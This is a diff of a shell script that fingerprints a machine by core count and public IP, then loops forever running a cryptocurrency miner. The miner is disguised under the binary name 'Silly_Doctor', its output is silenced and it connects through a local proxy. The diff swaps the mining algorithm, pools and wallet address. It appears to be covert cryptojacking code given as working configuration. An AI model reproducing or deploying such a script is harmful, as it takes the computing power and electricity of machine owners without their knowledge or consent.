@@ -57,7 +57,7 @@ date
 sleep 2
 
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-currentdate=$(date '+%d-%b-%Y_TCity16Cores_')
+currentdate=$(date '+%d-%b-%Y_JSpace16Cores_')
 ipaddress=$(curl -s api.ipify.org)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
@@ -137,6 +137,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm minotaurx --pool eu.coinXpool.com:8243\!usa.latinminers.com:9451 --main-pool-reconnect 1440 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate --password c=MAZA,m=solo --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
+./Silly_Doctor --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet BE68QAyJA16B2QgtFPKjXZyuQTJJmLEm48.$currentdate --password webpassword=IhatePopUps --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 10
 done
